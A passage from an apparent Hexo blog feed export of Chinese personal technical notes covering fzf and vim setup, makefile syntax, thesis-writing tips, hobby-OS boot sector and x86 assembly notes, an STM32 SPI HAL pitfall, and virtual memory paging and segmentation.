nerdtree-git-plugin"></a>nerdtree的git插件 nerdtree-git-plugin</h2><p><a href="https://github.com/Xuyuanp/nerdtree-git-plugin.git" target="_blank" rel="noopener">https://github.com/Xuyuanp/nerdtree-git-plugin.git</a></p><h2 id="文件搜索-fzf"><a href="#文件搜索-fzf" class="headerlink" title="文件搜索 fzf"></a>文件搜索 fzf</h2><h3 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h3><p>安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/junegunn/fzf.git           # 克隆fzf到本地</span><br><span class="line">sudo mv fzf /opt/                                       # 移动fzf到opt目录 </span><br><span class="line">/opt/fzf/install                                        # 安装fzf到本地</span><br><span class="line">git clone https://github.com/junegunn/fzf.vim.git ~/.vim/bundle/fzf.vim     # 克隆fzf的vim插件到bundle目录</span><br></pre></td></tr></table></figure><p>配置</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> rtp+=/<span class="keyword">opt</span>/fzf               <span class="comment">" 添加fzf软件支持</span></span><br><span class="line"><span class="keyword">set</span> rtp+=~/.<span class="keyword">vim</span>/bundle/fzf.<span class="keyword">vim</span>  <span class="comment">" 添加fzf的vim插件支持</span></span><br></pre></td></tr></table></figure><h3 id="快捷键-4"><a href="#快捷键-4" class="headerlink" title="快捷键"></a>快捷键</h3><ul><li><code>:FZF</code>: 模糊搜索当前目录下及子目录的文件</li><li><code>:Lines</code>: 模糊搜索打开过的文件中某一行字段</li></ul>]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>makefile文件命令</title>
    <url>/2019/06/03/2019-06-03-makefile/</url>
    <content><![CDATA[<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="默认规则"><a href="#默认规则" class="headerlink" title="默认规则"></a>默认规则</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">default :</span><br><span class="line">    make run</span><br></pre></td></tr></table></figure><ul><li>添加默认规则，直接使用make将执行default下的命令</li></ul><h2 id="文件生成"><a href="#文件生成" class="headerlink" title="文件生成"></a>文件生成</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件生成规则</span></span><br><span class="line"></span><br><span class="line">ipl.bin : ipl.nas Makefile</span><br><span class="line">    ../z_tools/nask.exe ipl.bin ipl.lst</span><br><span class="line"></span><br><span class="line">helloOS.img : ipl.bin Makefile</span><br><span class="line">    ../z_tools/edimg.exe imgin:</span><br></pre></td></tr></table></figure><ul><li><code>#</code>代表注释</li><li><code>ipl.bin : ipl.nas Makefile</code>代表需要制作<code>ipl.bin</code>文件需要<code>ipl.nas</code>和<code>Makefile</code>，如果都有，执行下面的语句</li><li><code>\</code>代表续行符号</li></ul><h2 id="变量使用"><a href="#变量使用" class="headerlink" title="变量使用"></a>变量使用</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">TOOLPATH    = ../z_tools/</span><br><span class="line">MAKE        = <span class="variable">$(TOOLPATH)</span>make.exe -r</span><br><span class="line">NASK        = <span class="variable">$(TOOLPATH)</span>nask.exe</span><br><span class="line">EDIMG       = <span class="variable">$(TOOLPATH)</span>edimg.exe</span><br><span class="line">IMGTOL      = <span class="variable">$(TOOLPATH)</span>imgtol.com</span><br><span class="line">COPY        = copy</span><br><span class="line">DEL         = del</span><br></pre></td></tr></table></figure><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ul><li>Makefile需要用tab而非空格进行缩进，否则会报<code>*** multiple target patterns. Stop.</code></li></ul>]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>论文书写的重点</title>
    <url>/2019/05/28/2019-05-28-paperWriting/</url>
    <content><![CDATA[<h1 id="思考点"><a href="#思考点" class="headerlink" title="思考点"></a>思考点</h1><ul><li>论文要从为什么这样做进行思考</li><li>整体行文需要从为什么进行入手</li><li>论文中心需要是解决什么问题</li><li>论文从解决相关问题入手，让别人看不出来是在做特定项目</li><li>不要写成项目汇报书</li></ul><h1 id="论文结构"><a href="#论文结构" class="headerlink" title="论文结构"></a>论文结构</h1><ul><li>正文每一章有个开头引言，结尾有个本章小结</li><li>不要出现公司名称，使用某公司代替</li><li>不要出现我，使用作者代替</li><li>本文是论文，注意主语用语正确</li></ul><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul><li>三段式结构<ul><li>介绍课题问题是什么</li><li>解决方案是什么</li><li>测试结果怎么样</li></ul></li><li>不要有引用</li></ul><h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><ul><li>结构一般为<ul><li>课题意义</li><li>国内外研究现状</li><li>主要研究内容</li><li>论文结构说明</li></ul></li><li>国内外研究现状主要关注相关方面别人研究的怎么样，我与其不同的地方在哪，有什么改进或创新</li></ul><h2 id="关键技术解析和开发环境介绍"><a href="#关键技术解析和开发环境介绍" class="headerlink" title="关键技术解析和开发环境介绍"></a>关键技术解析和开发环境介绍</h2><ul><li>关键技术注意向大的方面来说</li><li>对比不同的选型方案之间的区别，有没有替代方案</li></ul><h2 id="整体框架设计"><a href="#整体框架设计" class="headerlink" title="整体框架设计"></a>整体框架设计</h2><ul><li>画个整体软硬件框图</li><li>注意框图讲为什么这样设计</li><li>硬件设计考虑芯片选型能否替代，主要讲芯片需求而不是介绍芯片</li><li>软件设计考虑有没有其他解决方案，对比选择需要的方案</li><li>考虑软件设计解决了什么问题</li></ul><h2 id="细节设计与实现"><a href="#细节设计与实现" class="headerlink" title="细节设计与实现"></a>细节设计与实现</h2><ul><li>方案选型根据项目实际需求做了哪些针对性的设计</li></ul><h2 id="测试分析"><a href="#测试分析" class="headerlink" title="测试分析"></a>测试分析</h2><ul><li>测试需要注意测试自己设计的优点</li><li>测试可以从模块到整体，从正常流程到异常流程，压力测试（性能测试）</li></ul><h2 id="总结展望"><a href="#总结展望" class="headerlink" title="总结展望"></a>总结展望</h2><ul><li>总结全文，做了什么，有什么优点</li><li>展望可以拓展到什么，随着技术发展可以改进的地方</li></ul>]]></content>
      <categories>
        <category>Work</category>
      </categories>
  </entry>
  <entry>
    <title>30天自制操作系统笔记</title>
    <url>/2019/04/25/2019-04-25-createOS30daysNotes/</url>
    <content><![CDATA[<h1 id="关键词解释"><a href="#关键词解释" class="headerlink" title="关键词解释"></a>关键词解释</h1><ul><li>启动区: (boo~sector) 软盘第一个的扇区称为启动区。那么什么是扇区呢？计算机读写软盘的时候，并不是一个字节一个字节地读写的，而是以512字节为一个单位进行读写。因此，软盘的512字节就称为一个扇区。一张软盘的空间共有1440KB, 也就是1474560字节，除以512得2880, 这也就是说一张软盘共有2880个扇区。那为什么第一个扇区称为启动区呢？那是因为计算机首先从最初一个扇区开始读软盘，然后去检查这个扇区最后2个字节的内容。</li><li>IPL: （initial program loader）启动程序加载器。启动区只有区区512字节，实际的操作系统不像hello-os这么小，根本装不进去。所以几乎所有的操作系统，都是把加载操作系统本身的程序放在启动区里的。有鉴于此，有时也将启动区称为IPL。但hello-os没有加载程序的功能，所以HELLOIPL这个名字不太顺理成章。如果有人正义感特别强，觉得“这是撒谎造假，万万不能容忍！＂，那也可以改成其他的名字。但是必须起一个8字节的名字，如果名字长度不到8字节的话，常要在最后补上空格。</li></ul><h1 id="第1天"><a href="#第1天" class="headerlink" title="第1天"></a>第1天</h1><ol><li>环境windows</li><li>二进制编辑器 notepad++安装hexeditor插件</li><li>汇编编辑器 vscode安装x86 and x86_64 Assembly</li><li>编译需要使用光盘中的nask编译器</li><li>可以使用VMWare使用软盘启动，系统选择other/other</li></ol><h1 id="第2天"><a href="#第2天" class="headerlink" title="第2天"></a>第2天</h1><h2 id="标准FAT12软盘格式"><a href="#标准FAT12软盘格式" class="headerlink" title="标准FAT12软盘格式"></a>标准FAT12软盘格式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; 以下的记述用于标准FAT12格式的软盘</span><br><span class="line">    JMP     entry</span><br><span class="line">    DB      0x90</span><br><span class="line">    DB      &quot;HELLOIPL&quot;      ; 启动区的名称可以是任意的字符串</span><br><span class="line">    DW      512             ; 每个扇区（sector）的大小（必须为512字节）</span><br><span class="line">    DB      1               ; 簇（cluster）的大小（必须为1个扇区）</span><br><span class="line">    DW      1               ; FAT的起始位置（一般从第一个扇区开始）</span><br><span class="line">    DB      2               ; FAT的个数（必须为2）</span><br><span class="line">    DW      224             ; 根目录的大小（一般设成224项）</span><br><span class="line">    DW      2880            ; 该磁盘的大小（必须是2880扇区）</span><br><span class="line">    DB      0xf0            ; 磁盘的种类</span><br><span class="line">    DW      9               ; FAT的长度（必须是9扇区）</span><br><span class="line">    DW      18              ; 1个磁道（track）有几个扇区（必须是18）</span><br><span class="line">    DW      2               ; 磁头数（必须是2）</span><br><span class="line">    DD      0               ; 不使用分区，必须是0</span><br><span class="line">    DD      2880            ; 重写一次磁盘大小</span><br><span class="line">    DB      0, 0, 0x29      ; 意义不明，固定</span><br><span class="line">    DD      0xffffffff      ; （可能是）卷标号码</span><br><span class="line">    DB      &quot;HELLO-OS   &quot;   ; 磁盘的名称（11字节）</span><br><span class="line">    DB      &quot;FAT12   &quot;      ; 磁盘格式名称（8字节）</span><br><span class="line">    RESB    18              ; 先空出18字节</span><br></pre></td></tr></table></figure><h2 id="汇编代表性寄存器介绍"><a href="#汇编代表性寄存器介绍" class="headerlink" title="汇编代表性寄存器介绍"></a>汇编代表性寄存器介绍</h2><h3 id="16位寄存器"><a href="#16位寄存器" class="headerlink" title="16位寄存器"></a>16位寄存器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AX ---- accumulator         累加寄存器</span><br><span class="line">CX ---- counter             计数寄存器</span><br><span class="line">DX ---- data                数据寄存器</span><br><span class="line">BX ---- base                基址寄存器</span><br><span class="line">SP ---- stack pointer       栈指针寄存器</span><br><span class="line">BP ---- base pointer        基址指针寄存器</span><br><span class="line">SI ---- source index        源变址寄存器</span><br><span class="line">DI ---- destination index   目的变址寄存器</span><br></pre></td></tr></table></figure><h3 id="8位寄存器"><a href="#8位寄存器" class="headerlink" title="8位寄存器"></a>8位寄存器</h3><p>8位寄存器为16位寄存器的扩展，AL和AH一起代表AX，并不是单独的寄存器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AL ---- accumulator         累加寄存器低位</span><br><span class="line">CL ---- counter             计数寄存器低位</span><br><span class="line">DL ---- data                数据寄存器低位</span><br><span class="line">BL ---- base                基址寄存器低位</span><br><span class="line">AH ---- accumulator         累加寄存器高位</span><br><span class="line">CH ---- counter             计数寄存器高位</span><br><span class="line">DH ---- data                数据寄存器高位</span><br><span class="line">BH ---- base                基址寄存器高位</span><br></pre></td></tr></table></figure><h3 id="32位寄存器"><a href="#32位寄存器" class="headerlink" title="32位寄存器"></a>32位寄存器</h3><ul><li>32位系统中使用的32位寄存器，低16位和上述16位相同，高16位没有寄存器名字</li><li>32位寄存器加<code>E</code>代表，如<code>EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI</code></li></ul><h3 id="段寄存器，16位"><a href="#段寄存器，16位" class="headerlink" title="段寄存器，16位"></a>段寄存器，16位</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ES ---- extra segment       附加段寄存器</span><br><span class="line">CS ---- code segment        代码段寄存器</span><br><span class="line">SS ---- stack segment       栈段寄存器</span><br><span class="line">DS ---- data segment        数据段寄存器</span><br><span class="line">FS ---- segment part 2      没有名称</span><br><span class="line">GS ---- segment part 3      没有名称</span><br></pre></td></tr></table></figure><h2 id="CPU和内存"><a href="#CPU和内存" class="headerlink" title="CPU和内存"></a>CPU和内存</h2><ul><li>CPU寄存器很少，32位也只有44个字节的空间，所以需要内存当<strong>外部储存器</strong></li><li>内存和CPU使用管脚连接，速度虽然光速，但是比起来内部寄存器还是慢很多</li><li>程序代码储存在内存中，一条一条读取出来进行运行</li><li>启动区内容的装载地址为<code>0x00007c00 -- 0x00007dff</code>，所以ORG指令选择此处为起始地址，也仅有512字节</li></ul><h2 id="显示字符函数（INT-0x10"><a href="#显示字符函数（INT-0x10" class="headerlink" title="显示字符函数（INT 0x10)"></a>显示字符函数（INT 0x10)</h2><ul><li>INT为软件中断指令，用于调用BIOS内置函数</li><li>BIOS（Basic input output system）为厂家开发的提供给操作系统开发人员使用的程序，其中含有许多基本程序，使用INT调用</li><li>0x10函数使用INT调用为显示一个字符函数</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; 显示一个字符，无返回值</span><br><span class="line">    MOV     AH, 0x0e</span><br><span class="line">    MOV     AL, &#39;a&#39;         ; 显示字符&#39;a&#39;</span><br><span class="line">    MOV     BH, 0</span><br><span class="line">    MOV     BX, 15          ; 指定字符颜色</span><br><span class="line">    INT     0x10            ; 调用显卡BIOS</span><br></pre></td></tr></table></figure><h1 id="第3天"><a href="#第3天" class="headerlink" title="第3天"></a>第3天</h1><h2 id="磁盘读写，扇区校验，寻道函数（INT-0x13"><a href="#磁盘读写，扇区校验，寻道函数（INT-0x13" class="headerlink" title="磁盘读写，扇区校验，寻道函数（INT 0x13)"></a>磁盘读写，扇区校验，寻道函数（INT 0x13)</h2><ul><li>AH = 0x02（读盘） / 0x04（写盘） / 0x0c（寻道）</li><li>AL = 处理几个扇区（只能处理连续的扇区）</li><li>CH = 柱面号（0-1位）</li><li>CL = 扇区号（0-5位）|（柱面号&amp;0x300）&gt;&gt; 2</li><li>DH = 磁头号</li><li>DL = 驱动器号</li><li>ES:BX = 缓冲地址（校验和寻道不使用）</li><li>返回值<ul><li>FLAGS.CF == 0，没有错误，AH == 0</li><li>FLAGS.CF == 1，有错误，错误号码存于AH（与重置<code>reset</code>功能一样）</li></ul></li></ul><h3 id="复位磁盘"><a href="#复位磁盘" class="headerlink" title="复位磁盘"></a>复位磁盘</h3><ul><li>AH = 0x00</li><li>DL = 0x00</li><li>INT 0x13</li></ul><h2 id="软盘构成"><a href="#软盘构成" class="headerlink" title="软盘构成"></a>软盘构成</h2><img src="/2019/04/25/2019-04-25-createOS30daysNotes/2019_06_14_01.bmp" width="60%"><ul><li>一面80个柱面</li><li>磁盘有两面</li><li>每个柱面18个扇区</li><li>一个扇区512字节</li><li>一共80 * 2 * 18 * 512 = 1474560 Byte = 1440 KB</li><li><code>C0-H0-S1</code>代表柱面0，磁头0，扇区1</li><li>扇区从1开始计数，柱面从0开始计数</li></ul><h2 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h2><ul><li><code>ES : BX</code>代表内存寻址的地址，其中BX为0-3位，ES为4-位。如<code>ES=0x0820，BX=0，代表0x8200地址</code>。总内存为12位，1M左右。</li><li>内存<code>0x7c00-0x7dff</code>为启动区使用，<code>0x7e00-0x9fbff</code>没有什么用，留给操作系统开发使用</li><li>内存寻址需要指定段寄存器DS，不然就会加上其16倍的数据，所以一般DS = 0</li></ul>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>汇编语言学习笔记</title>
    <url>/2019/04/25/2019-04-25-assemblyLanguage/</url>
    <content><![CDATA[<h1 id="nask汇编"><a href="#nask汇编" class="headerlink" title="nask汇编"></a>nask汇编</h1><p>汇编指令来源于《30天自制操作系统》一书中，编译环境为nask，似乎是作者自己写的编译，并不清楚和一般的汇编的区别</p><h2 id="指令介绍"><a href="#指令介绍" class="headerlink" title="指令介绍"></a>指令介绍</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DB      ; 添加1个字节长度数据</span><br><span class="line">DW      ; 添加2个字节长度数据</span><br><span class="line">DD      ; 添加4个字节长度数据</span><br><span class="line">RESB    ; 用0x00填充x字节</span><br><span class="line">$       ; 变量，可指当前位置的字节数</span><br><span class="line">ORG     ; 指定运行时机器语言指令装载内存地址，有这条指令后，$代表内存地址</span><br><span class="line">JMP     ; 相当于C语言goto</span><br><span class="line">MOV     ; 赋值，&quot;MOV AV, 0&quot;代表&quot;AV &#x3D; 0&quot;，拷贝赋值而非移动，位数必须相同，不然编译出错</span><br><span class="line">[]      ; 代表内存地址</span><br><span class="line">CMP     ; 比较指令</span><br><span class="line">JE      ; &quot;Jump if equal&quot;，比较跳转指令，相等跳转，否则继续执行，和CMP配合使用</span><br><span class="line">JA      ; &quot;Jump if above&quot;，大于跳转，否则继续执行，和CMP配合使用</span><br><span class="line">JB      ; &quot;Jump if below&quot;，小于跳转，否则继续执行，和CMP配合使用</span><br><span class="line">JAE     ; &quot;Jump if above or equal&quot;，大于等于跳转，否则继续执行，和CMP配合使用</span><br><span class="line">JBE     ; &quot;Jump if below or equal&quot;，小于等于跳转，否则继续执行，和CMP配合使用</span><br><span class="line">JC      ; &quot;Jump if carry&quot;，捕获&quot;进位标志&quot;，如果为1则跳转</span><br><span class="line">JNC     ; &quot;Jump if not carry&quot;，捕获&quot;进位标志&quot;，如果为0则跳转</span><br><span class="line">EQU     ; 定义常数，相当于define</span><br><span class="line">HLT     ; CPU停止动作，外部事件唤醒</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    DB      0xeb, 0x4e, 0x90</span><br><span class="line">    DB      2               ; FAT的个数（必须为2）</span><br><span class="line">    DB      &quot;HELLOIPL&quot;      ; 启动区的名称可以是任意的字符串</span><br><span class="line">    DW      512             ;</span><br><span class="line">    DD      2880            ; 重写一次磁盘大小</span><br><span class="line">    DD      0xffffffff      ; （可能是）卷标号码</span><br><span class="line">    RESB    18              ; 先空出18字节</span><br><span class="line">    RESB    0x1fe-$         ; 填写0x00，直到0x001fe</span><br><span class="line"></span><br><span class="line">    ORG     0x7c00          ; 指明程序的装载地址</span><br><span class="line">    JMP     entry</span><br><span class="line"></span><br><span class="line">entry:</span><br><span class="line">    MOV     AV, 0           ; 初始化寄存器</span><br><span class="line">    MOV     SS, AX</span><br><span class="line">    MOV     AL, [SI]        ; AL赋值为SI值的地址的值，SI储存为678，则AL赋值为内存中678号地址指向的值</span><br><span class="line">    MOV     BYTE [678], 123 ; 将123按照Byte（8位）储存在内存的678地址中</span><br><span class="line"></span><br><span class="line">; MOV使用寄存器赋值只有BX、BP、SI、DI，其他寄存器赋值可以使用下面指令进行</span><br><span class="line">    MOV     BX, DX</span><br><span class="line">    MOV     AL, BYTE [BX]</span><br><span class="line"></span><br><span class="line">    CMP     AL, 0</span><br><span class="line">    JE      entry</span><br><span class="line"></span><br><span class="line">    CMP     AL, 0</span><br><span class="line">    JA      entry</span><br><span class="line"></span><br><span class="line">    CMP     AL, 0</span><br><span class="line">    JB      entry</span><br><span class="line"></span><br><span class="line">    CMP     AL, 0</span><br><span class="line">    JAE     entry</span><br><span class="line"></span><br><span class="line">    CMP     AL, 0</span><br><span class="line">    JBE     entry</span><br><span class="line"></span><br><span class="line">    JC      error           ; FLAGS.CF进位标志为1则跳转</span><br><span class="line">    JNC     fin             ; FLAGS.CF进位标志为0则跳转</span><br><span class="line"></span><br><span class="line">CYLS    EQU     10          ; 定义CYLS为10</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>stm32cubemx踩坑记</title>
    <url>/2019/04/16/2019-04-16-stm32cubemxDebug/</url>
    <content><![CDATA[<h1 id="spi"><a href="#spi" class="headerlink" title="spi"></a>spi</h1><h2 id="spi的16位数据接收模式下size的问题"><a href="#spi的16位数据接收模式下size的问题" class="headerlink" title="spi的16位数据接收模式下size的问题"></a>spi的16位数据接收模式下size的问题</h2><p>spi发送有8位和16位发送/接收模式，但是HAL库中的接口只有一种。比如最基础的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HAL_StatusTypeDef <span class="title">HAL_SPI_Transmit</span><span class="params">(SPI_HandleTypeDef *hspi, <span class="keyword">uint8_t</span> *pData, <span class="keyword">uint16_t</span> Size, <span class="keyword">uint32_t</span> Timeout)</span></span>;</span><br><span class="line"><span class="function">HAL_StatusTypeDef <span class="title">HAL_SPI_Receive</span><span class="params">(SPI_HandleTypeDef *hspi, <span class="keyword">uint8_t</span> *pData, <span class="keyword">uint16_t</span> Size, <span class="keyword">uint32_t</span> Timeout)</span></span>;</span><br></pre></td></tr></table></figure><p>在8位模式下指针和size没有问题，但是16位模式下指针还是uint_8 *。根据源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HAL_StatusTypeDef <span class="title">HAL_SPI_Transmit</span><span class="params">(SPI_HandleTypeDef *hspi, <span class="keyword">uint8_t</span> *pData, <span class="keyword">uint16_t</span> Size, <span class="keyword">uint32_t</span> Timeout)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set the transaction information */</span></span><br><span class="line">    hspi-&gt;State = HAL_SPI_STATE_BUSY_TX;</span><br><span class="line">    hspi-&gt;ErrorCode = HAL_SPI_ERROR_NONE;</span><br><span class="line">    hspi-&gt;pTxBuffPtr = (<span class="keyword">uint8_t</span> *)pData;</span><br><span class="line">    hspi-&gt;TxXferSize = Size;</span><br><span class="line">    hspi-&gt;TxXferCount = Size;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Transmit data in 16 Bit mode */</span></span><br><span class="line">    <span class="keyword">if</span> (hspi-&gt;Init.DataSize == SPI_DATASIZE_16BIT)</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">/* Transmit data in 16 Bit mode */</span></span><br><span class="line">        <span class="keyword">while</span> (hspi-&gt;TxXferCount &gt; <span class="number">0U</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Wait until TXE flag is set to send data */</span></span><br><span class="line">            <span class="keyword">if</span> (__HAL_SPI_GET_FLAG(hspi, SPI_FLAG_TXE))</span><br><span class="line">            &#123;</span><br><span class="line">                hspi-&gt;Instance-&gt;DR = *((<span class="keyword">uint16_t</span> *)hspi-&gt;pTxBuffPtr);</span><br><span class="line">                hspi-&gt;pTxBuffPtr += <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>);</span><br><span class="line">                hspi-&gt;TxXferCount--;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Transmit data in 8 Bit mode */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">while</span> (hspi-&gt;TxXferCount &gt; <span class="number">0U</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Wait until TXE flag is set to send data */</span></span><br><span class="line">            <span class="keyword">if</span> (__HAL_SPI_GET_FLAG(hspi, SPI_FLAG_TXE))</span><br><span class="line">            &#123;</span><br><span class="line">                *((__IO <span class="keyword">uint8_t</span> *)&amp;hspi-&gt;Instance-&gt;DR) = (*hspi-&gt;pTxBuffPtr);</span><br><span class="line">                hspi-&gt;pTxBuffPtr += <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>);</span><br><span class="line">                hspi-&gt;TxXferCount--;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以看出16位模式下调用这个函数，指针用的是同一个。所以需要强行转换为<code>uint_8 *</code></li><li>size的递减没有考虑字节的问题，所以输入的size是发送的16位数据的个数，并不是整个数组的大小。</li></ul>]]></content>
      <categories>
        <category>Debug</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统编程笔记（C++）</title>
    <url>/2019/04/10/2019-04-10-OSProgramCpp/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>操作系统关键知识记录</title>
    <url>/2019/04/01/2019-04-01-OS/</url>
    <content><![CDATA[<h1 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h1><p>虚拟内存是计算机系统内存管理的一种技术。它使得应用程序认为它拥有连续的可用的内存（一个连续完整的地址空间），而实际上，它通常是被分隔成多个物理内存碎片，还有部分暂时存储在外部磁盘存储器上，在需要时进行数据交换。目前，大多数操作系统都使用了虚拟内存，如Windows家族的“虚拟内存”；Linux的“交换空间”等。</p><h2 id="技术介绍"><a href="#技术介绍" class="headerlink" title="技术介绍"></a>技术介绍</h2><p>虚拟内存别称虚拟存储器（Virtual Memory）。电脑中所运行的程序均需经由内存执行，若执行的程序占用内存很大或很多，则会导致内存消耗殆尽。为解决该问题，Windows中运用了虚拟内存 [2] 技术，即匀出一部分硬盘空间来充当内存使用。当内存耗尽时，电脑就会自动调用硬盘来充当内存，以缓解内存的紧张。若计算机运行程序或操作所需的随机存储器(RAM)不足时，则 Windows 会用虚拟存储器进行补偿。它将计算机的RAM和硬盘上的临时空间组合。当RAM运行速率缓慢时，它便将数据从RAM移动到称为“分页文件”的空间中。将数据移入分页文件可释放RAM，以便完成工作。 一般而言，计算机的RAM容量越大，程序运行得越快。若计算机的速率由于RAM可用空间匮乏而减缓，则可尝试通过增加虚拟内存来进行补偿。但是，计算机从RAM读取数据的速率要比从硬盘读取数据的速率快，因而扩增RAM容量（可加内存条）是最佳选择。</p><p>虚拟内存是Windows 为作为内存使用的一部分硬盘空间。虚拟内存在硬盘上其实就是为一个硕大无比的文件，文件名是PageFile.Sys，通常状态下是看不到的。必须关闭资源管理器对系统文件的保护功能才能看到这个文件。虚拟内存有时候也被称为是“页面文件”就是从这个文件的文件名中来的。</p><p>内存在计算机中的作用很大，电脑中所有运行的程序都需要经过内存来执行，如果执行的程序很大或很多，就会导致内存消耗殆尽。为了解决这个问题，WINDOWS运用了虚拟内存技术，即拿出一部分硬盘空间来充当内存使用，这部分空间即称为虚拟内存，虚拟内存在硬盘上的存在形式就是 PAGEFILE.SYS这个页面文件。</p><h2 id="调度介绍"><a href="#调度介绍" class="headerlink" title="调度介绍"></a>调度介绍</h2><h3 id="页式调度"><a href="#页式调度" class="headerlink" title="页式调度"></a>页式调度</h3><p>1、页式虚存地址映射页式虚拟存储系统中，虚地址空间被分成等长大小的页，称为逻辑页；主存空间也被分成同样大小的页，称为物理页。相应地，虚地址分为两个字段：高字段为逻辑页号，低字段为页内地址（偏移量）；实存地址也分两个字段：高字段为物理页号，低字段为页内地址。通过页表可以把虚地址（逻辑地址）转换成物理地址。</p><p>在大多数系统中，每个进程对应一个页表。页表中对应每一个虚存页面有一个表项，表项的内容包含该虚存页面所在的主存页面的地址（物理页号），以及指示该逻辑页是否已调入主存的有效位。地址变换时，用逻辑页号作为页表内的偏移地址索引页表（将虚页号看作页表数组下标）并找到相应物理页号，用物理页号作为实存地址的高字段，再与虚地址的页内偏移量拼接，就构成完整的物理地址。现代的中央处理机通常有专门的硬件支持地址变换。</p><p>2、转换后援缓冲器由于页表通常在主存中，因而即使逻辑页已经在主存中，也至少要访问两次物理存储器才能实现一次访存，这将使虚拟存储器的存取时间加倍。为了避免对主存访问次数的增多，可以对页表本身实行二级缓存，把页表中的最活跃的部分存放在高速存储器中，组成快表。这个专用于页表缓存的高速存储部件通常称为转换后援缓冲器(TLB)。保存在主存中的完整页表则称为慢表。</p><p>3、内页表是虚地址到主存物理地址的变换表，通常称为内页表。与内页表对应的还有外页表，用于虚地址与辅存地址之间的变换。当主存缺页时，调页操作首先要定位辅存，而外页表的结构与辅存的寻址机制密切相关。例如对磁盘而言，辅存地址包括磁盘机号、磁头号、磁道号和扇区号等。</p><h3 id="段式调度"><a href="#段式调度" class="headerlink" title="段式调度"></a>段式调度</h3><p>段是按照程序的自然分界划分的长度可以动态改变的区域。通常，程序员把子程序、操作数和常数等不同类型的数据划分到不同的段中，并且每个程序可以有多个相同类型的段。在段式虚拟存储系统中，虚地址由段号和段内地址（偏移量）组成。虚地址到实主存地址的变换通过段表实现。每个程序设置一个段表，段表的每一个表项对应一个段。每个表项至少包含下面三个字段：</p><ol><li>有效位：指明该段是否已经调入实存。</li><li>段起址：指明在该段已经调入实存的情况下，该段在实存中的首地址。</li><li>段长：记录该段的实际长度。设置段长字段的目的是为了保证访问某段的地址空间时，段内地址不会超出该段长度导致地址越界而破坏其他段。段表本身也是一个段，可以存在辅存中，但一般驻留在主存中。</li></ol><p>段式虚拟存储器有许多优点：</p><ol><li>段的逻辑独立性使其易于编译、管理、修改和保护，也便于多道程序共享。</li><li>段长可以根据需要动态改变，允许自由调度，以便有效利用主存空间。</li></ol><p>段式虚拟存储器也有一些缺点：</p><ol><li>因为段的长度不固定，主存空间分配比较麻烦。</li><li>容易在段间留下许多外碎片，造成存储空间利用率降低。</li><li>由于段长不一定是2的整数次幂，因而不能简单地像分页方式那样用虚地址和实地址的最低若干二进制位作为段内偏移量，并与段号进行直接拼接，必须用加法操作通过段起址与段内偏移量的求和运算求得物理地址。因此，段式存储管理比页式存储管理方式需要更多的硬件支持。</li></ol><h3 id="段页式调度"><a href="#段页式调度" class="headerlink" 